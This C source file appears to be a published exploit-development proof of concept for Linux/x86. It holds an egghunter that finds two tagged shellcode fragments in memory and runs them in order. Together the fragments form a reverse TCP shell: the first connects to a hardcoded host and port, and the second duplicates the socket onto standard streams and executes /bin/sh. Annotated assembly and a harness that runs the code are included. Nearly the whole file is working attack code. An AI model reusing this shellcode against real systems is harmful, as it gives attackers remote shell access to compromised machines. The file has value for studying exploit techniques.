/*
    Title:      Multi-Egghunter
    Author:     Ryan Fenno (@ryanfenno)
    Date:       20 September 2013
    Tested on:  Linux/x86 (Ubuntu 12.0.3)

    Description:

    This entry represents an extension of skape's sigaction(2)
    egghunting method [1] to multiple eggs. It is similar in spirit
    to BJ 'SkyLined' Wever's omelet shellcode for Win32 [2]. The
    proof-of-concept presented here splits a reverse TCP bind shell [3]
    into two parts. The egghunter is not only responsible for finding
    the two eggs, but also for executing them in the correct order. It
    is readily extendable to any (reasonable) number of eggs.

    References:

    [1] skape, "Safely Searching Process Virtual Address Space",
        www.hick.org/code/skape/papers/egghunt-shellcode.pdf
    [2] Wever, Berend-Jan, "w32-SEH-omelet-shellcode",
        http://code.google.com/p/w32-seh-omelet-shellcode/
    [3] Willis, R. "reversetcpbindshell",
        http://shell-storm.org/shellcode/files/shellcode-849.php
*/

#include <stdio.h>

#define    MARKER  "\x93\x51\x93\x59"
#define    TAG1    "\x01\x51\x93\x59" // easiest to use latter three bytes
#define    TAG2    "\x02\x51\x93\x59" // of MARKER for latter three of TAGs

// first egg/tag/shellcode
#define    IPADDR  "\xc0\xa8\x7a\x01" // 192.168.122.1
#define    PORT    "\xab\xcd"         // 43981
unsigned char shellcode1[] =
MARKER
TAG1
//SHELLCODE1
"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80"
"\x96\xb0\x66\xb3\x03\x68"    IPADDR    "\x66\x68" PORT "\x66"
"\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80"
// perform the jump
"\x83\xc4\x20\x5f\x83\xec\x24\xff\xe7"
;
/*
global _start
section .text
_start:
    xor ebx, ebx
    mul ebx

    mov al, 0x66          ; socketcall() <linux/net.h>
    inc ebx               ; socket()
    push edx              ; arg3 :: protocol    = 0
    push ebx              ; arg2 :: SOCK_STREAM = 1
    push byte 0x2         ; arg1 :: AF_INET     = 2
    mov ecx, esp
    int 0x80
    xchg eax, esi         ; save clnt_sockfd in esi
    mov al, 0x66          ; socketcall()
    mov bl, 0x3           ; connect()
                          ; build sockaddr_in struct (srv_addr)
    push dword 0x017AA8C0 ;   IPv4 address 192.168.122.1 in hex (little endian)
    push word 0x697a      ;   TCP port 0x7a69 = 31337
    push word 0x2         ;   AF_INET = 2
    mov ecx, esp          ; pointer to sockaddr_in struct
    push dword 0x10       ; arg3 :: sizeof(struct sockaddr) = 16 [32-bits]
    push ecx              ; arg2 :: pointer to sockaddr_in struct
    push esi              ; arg1 :: clnt_sockfd
    mov ecx, esp
    int 0x80

    ;---- perform the jump
    ; looking at the stack at this point, the target for the jump
    ; is at $esp+0x20, so...
    add esp, 0x20
    pop edi
    sub esp, 0x24
    jmp edi
*/

// second egg/tag/shellcode
unsigned char shellcode2[] =
MARKER
TAG2
//SHELLCODE2
"\x5b\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b"
"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89"
"\xe2\x53\x89\xe1\xcd\x80"
;
/*
global _start
section .text
_start:
    pop ebx           ; arg1 :: clnt_sockfd
    push 0x2
    pop ecx           ; loop from 2 to 0
dup2loop:
    mov byte al, 0x3F ; dup2(2)
    int 0x80
    dec ecx
    jns dup2loop      ; loop ends when ecx == -1
    xor eax, eax
    mov byte al, 0x0B ; execve(2)
    push edx          ; null terminator
    push 0x68732f2f   ; "hs//"
    push 0x6e69622f   ; "nib/"
    mov ebx, esp      ; arg1 :: "/bin/sh\0"
    push edx          ; null terminator
    mov edx, esp      ; arg3 :: envp = NULL array
    push ebx
    mov ecx, esp      ; arg2 :: argv array (ptr to string)
    int 0x80
*/

unsigned char egghunter[] =
"\x6a\x02\x59\x57\x51\x31\xc9\x66\x81\xc9\xff\x0f\x41\x6a\x43"
"\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"    MARKER    "\x89\xcf\xaf"
"\x75\xec\x89\xcb\x59\x20\xc8\xaf\x51\x89\xd9\x75\xe1\x59\xe2"
"\xd5\xff\xe7";
/*
    global _start
    section .text
    _start:
        push byte 0x2
        pop ecx             ; number of eggs
    eggLoop:
        push edi            ; memory location of ecx-th piece; first of
                            ; these is meaningless
        push ecx            ; save counter
        xor ecx, ecx        ; initialize ecx for memory search
    fillOnes:
        or cx, 0xfff
    shiftUp:
        inc ecx
        push byte 0x43      ; sigaction(2)
        pop eax
        int 0x80
        cmp al, 0xf2
        jz fillOnes
        mov eax, 0x59935193 ; marker
        mov edi, ecx
        scasd               ; advances edi by 0x4 if there is a match;
                            ; assumes direction flag (DF) is not set
        jnz shiftUp
        mov ebx, ecx        ; save off ecx in case we need to keep looking
        pop ecx             ; restore counter
        and al, cl          ; tag in eax
        scasd
        push ecx
        mov ecx, ebx
        jnz shiftUp
        pop ecx
        loop eggLoop
        jmp edi
*/

void main() {
    printf("egghunter length:   %d\n", sizeof(egghunter)-1);
    printf("shellcode1 length:  %d\n", sizeof(shellcode1)-1);
    printf("shellcode2 length:  %d\n", sizeof(shellcode2)-1);
    ((int(*)())egghunter)();
}